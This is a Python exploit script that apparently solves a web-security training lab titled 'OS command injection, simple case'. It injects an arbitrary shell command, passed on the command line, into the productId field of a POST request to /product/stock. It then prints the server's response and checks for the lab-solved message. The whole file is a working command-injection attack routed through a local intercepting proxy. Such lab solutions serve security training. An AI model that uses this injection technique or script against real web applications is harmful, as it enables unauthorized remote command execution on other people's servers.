# OS command injection, simple case

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



##########################################################
#	FUNCTIONS
##########################################################


def run_cmd(url, cmd):
	check_stock_path = '/product/stock'
	params = {'productId': '1 & ' + cmd + ' #', 'storeId': '1' }
	print("[+] Trying to run command '%s' on the target website..." % cmd)
	print(f"[+] Sending post request on {check_stock_path}:\n\t{params}\n")
	r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
	time.sleep(1)
	if r.status_code == 200 and len(r.text) > 3:
		print("[+] %s\'s response:" % url)
		print(r.text)
	else:
		print("[-] Command Injection Failed !!!")



##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: OS command injection, simple case')
	try:
		url = sys.argv[1].strip()
		cmd = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <COMMAND>' % sys.argv[0])
		print('[+] Example: %s https://www.target.com "id"' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send OS Command Injection ...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			run_cmd(url, cmd)
			time.sleep(2)
			r = requests.get(url, verify=False, proxies=proxies)
			print(r)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()